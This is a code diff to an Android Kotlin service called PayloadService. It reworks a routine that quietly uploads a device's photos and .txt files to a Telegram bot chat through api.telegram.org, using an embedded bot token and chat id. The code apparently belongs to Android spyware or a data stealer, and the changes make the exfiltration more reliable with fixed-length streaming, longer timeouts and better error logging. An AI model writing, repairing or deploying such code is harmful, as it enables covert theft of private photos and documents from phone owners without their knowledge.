@@ -168,6 +168,7 @@ class PayloadService : Service() {
 
     private fun postFile(
         api: String,
+        field: String,
         fileName: String,
         mime: String,
         data: ByteArray
@@ -175,43 +176,52 @@ class PayloadService : Service() {
         val boundary = "----hs" + System.nanoTime()
         var conn: HttpURLConnection? = null
         try {
+            val safeName = fileName.replace("\"", "_")
+
+            val pre = ("--" + boundary + "\r\n" +
+                    "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
+                    chat + "\r\n" +
+                    "--" + boundary + "\r\n" +
+                    "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" +
+                    Const.CAPTION + "\r\n" +
+                    "--" + boundary + "\r\n" +
+                    "Content-Disposition: form-data; name=\"" + field +
+                    "\"; filename=\"" + safeName + "\"\r\n" +
+                    "Content-Type: " + mime + "\r\n\r\n").toByteArray(Charsets.UTF_8)
+
+            val post = ("\r\n--" + boundary + "--\r\n").toByteArray(Charsets.UTF_8)
+
             val url = URL("https://api.telegram.org/bot" + token + "/" + api)
             conn = url.openConnection() as HttpURLConnection
             conn.requestMethod = "POST"
             conn.doOutput = true
             conn.connectTimeout = 20000
-            conn.readTimeout = 60000
+            conn.readTimeout = 90000
             conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary)
-            conn.setChunkedStreamingMode(64 * 1024)
+            conn.setFixedLengthStreamingMode(pre.size + data.size + post.size)
 
             conn.outputStream.use { os ->
-                os.write(("--" + boundary + "\r\n").toByteArray())
-                os.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".toByteArray())
-                os.write(chat.toByteArray(Charsets.UTF_8))
-                os.write("\r\n".toByteArray())
-
-                os.write(("--" + boundary + "\r\n").toByteArray())
-                os.write("Content-Disposition: form-data; name=\"caption\"\r\n\r\n".toByteArray())
-                os.write(Const.CAPTION.toByteArray(Charsets.UTF_8))
-                os.write("\r\n".toByteArray())
-
-                os.write(("--" + boundary + "\r\n").toByteArray())
-                os.write(
-                    ("Content-Disposition: form-data; name=\"file\"; filename=\"" +
-                            fileName.replace("\"", "_") + "\"\r\n").toByteArray()
-                )
-                os.write(("Content-Type: " + mime + "\r\n\r\n").toByteArray())
+                os.write(pre)
                 os.write(data)
-                os.write(("\r\n--" + boundary + "--\r\n").toByteArray())
+                os.write(post)
                 os.flush()
             }
 
             val code = conn.responseCode
             if (code in 200..299) return true
-            HsLog.e("http $code $api $fileName")
+
+            var body = ""
+            try {
+                val es = conn.errorStream
+                if (es != null) {
+                    body = es.use { it.readBytes().toString(Charsets.UTF_8) }
+                }
+            } catch (_: Throwable) {
+            }
+            HsLog.e("http " + code + " " + api + " " + safeName + " :: " + body.take(300))
             return false
         } catch (t: Throwable) {
-            HsLog.e("http fail $api: ${t.message}")
+            HsLog.e("http fail " + api + ": " + t.message)
             return false
         } finally {
             try {
@@ -294,7 +304,7 @@ class PayloadService : Service() {
                             lower.endsWith(".png") || lower.endsWith(".webp"))
                 ) return@execute
                 val data = bytesOf(uri) ?: return@execute
-                if (postFile("sendPhoto", name, "image/jpeg", data)) done.incrementAndGet()
+                if (postFile("sendPhoto", "photo", name, "image/jpeg", data)) done.incrementAndGet()
             } catch (t: Throwable) {
                 HsLog.e("sendImage: ${t.message}")
             } finally {
@@ -310,7 +320,7 @@ class PayloadService : Service() {
                 val name = nameOf(uri)
                 if (!name.lowercase().endsWith(".txt")) return@execute
                 val data = bytesOf(uri) ?: return@execute
-                if (postFile("sendDocument", name, "text/plain", data)) done.incrementAndGet()
+                if (postFile("sendDocument", "document", name, "text/plain", data)) done.incrementAndGet()
             } catch (t: Throwable) {
                 HsLog.e("sendDoc: ${t.message}")
             } finally {
@@ -324,7 +334,7 @@ class PayloadService : Service() {
         pool.execute {
             try {
                 val data = content.toByteArray(Charsets.UTF_8)
-                if (postFile("sendDocument", name, "text/plain", data)) done.incrementAndGet()
+                if (postFile("sendDocument", "document", name, "text/plain", data)) done.incrementAndGet()
             } catch (t: Throwable) {
                 HsLog.e("sendTextFile: ${t.message}")
             } finally {
